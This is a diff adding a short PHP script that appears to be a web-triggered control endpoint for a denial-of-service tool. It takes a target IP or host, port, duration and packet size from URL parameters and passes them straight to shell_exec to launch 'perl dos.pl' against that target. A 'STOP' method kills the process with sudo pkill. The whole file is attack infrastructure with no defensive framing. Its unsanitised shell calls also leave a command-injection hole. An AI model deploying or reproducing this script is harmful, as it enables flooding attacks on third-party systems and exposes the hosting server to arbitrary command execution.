@@ -1,0 +1,24 @@
+<?php
+        $attacktype = $_GET["method"];
+        $ip = $_GET["ip"];
+        if (empty($ip)) { $ip = $_GET["host"]; }
+        $port = $_GET["port"];
+        $time = $_GET["time"];
+	    	$pack = $_GET["pack"];
+        $proc   = hash('crc32', $ip);
+           
+           
+        if (empty($ip) || empty($port) || empty($time) || empty($pack) || empty($attacktype)) {			
+				
+            
+      } if (($attacktype == "dos") || ($attacktype == "DDOS")) {
+        
+        $output = shell_exec("perl dos.pl $ip $port $time $pack");  }
+        
+        
+        
+        
+         if (($attacktype == "STOP") || ($attacktype == "STOP")) {
+         
+         $output = shell_exec("sudo pkill -f $proc "); }
+?>
